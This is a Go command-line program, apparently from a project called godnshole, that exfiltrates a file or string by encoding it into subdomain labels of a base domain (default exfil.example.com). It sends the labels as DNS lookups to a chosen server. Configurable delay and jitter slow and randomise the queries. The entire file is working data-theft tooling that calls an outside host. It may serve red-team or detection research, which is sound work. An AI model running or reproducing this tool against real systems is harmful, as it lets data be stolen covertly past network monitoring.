package main

import (
	"context"
	"flag"
	"log"
	"net"
	"os"
	"time"

	"github.com/afterdarksys/godnshole/pkg/dnsencoder"
)

func main() {
	domain := flag.String("domain", "exfil.example.com", "Base domain for exfiltration")
	dnsServer := flag.String("server", "127.0.0.1:53", "DNS server address")
	file := flag.String("file", "", "File to exfiltrate")
	data := flag.String("data", "", "Data to exfiltrate (alternative to -file)")
	delay := flag.Int("delay", 100, "Delay between queries in milliseconds")
	encoding := flag.String("encoding", "base32", "Encoding type (base32 or dictionary)")
	jitter := flag.Int("jitter", 0, "Jitter percentage for delay (e.g. 20 for +/- 20%)")
	flag.Parse()

	if *file == "" && *data == "" {
		log.Fatal("Either -file or -data must be specified")
	}

	var payload []byte
	var err error

	if *file != "" {
		payload, err = os.ReadFile(*file)
		if err != nil {
			log.Fatalf("Failed to read file: %v", err)
		}
		log.Printf("Loaded %d bytes from %s", len(payload), *file)
	} else {
		payload = []byte(*data)
		log.Printf("Using provided data: %d bytes", len(payload))
	}

	var encoder interface {
		EncodeToSubdomains(data []byte) ([]string, error)
	}
	if *encoding == "dictionary" {
		encoder = dnsencoder.NewDictionaryEncoder(*domain)
	} else {
		encoder = dnsencoder.NewEncoder(*domain)
	}

	queries, err := encoder.EncodeToSubdomains(payload)
	if err != nil {
		log.Fatalf("Failed to encode data: %v", err)
	}

	log.Printf("Generated %d DNS queries for exfiltration", len(queries))

	// Send queries
	resolver := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{}
			return d.DialContext(ctx, "udp", *dnsServer)
		},
	}

	successful := 0
	for i, query := range queries {
		log.Printf("[%d/%d] Exfiltrating via: %s", i+1, len(queries), query)

		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		_, err := resolver.LookupHost(ctx, query)
		cancel()

		if err != nil {
			// DNS lookup "failure" is expected - we're just sending data
			log.Printf("  Query sent (error expected): %v", err)
		}

		successful++
		if *jitter > 0 {
			jVal := (*delay * *jitter) / 100
			if jVal == 0 {
				jVal = 1
			}
			actualDelay := *delay - jVal + (int(time.Now().UnixNano()) % (2 * jVal))
			time.Sleep(time.Duration(actualDelay) * time.Millisecond)
		} else {
			time.Sleep(time.Duration(*delay) * time.Millisecond)
		}
	}

	log.Printf("Exfiltration complete: %d/%d queries sent", successful, len(queries))
}
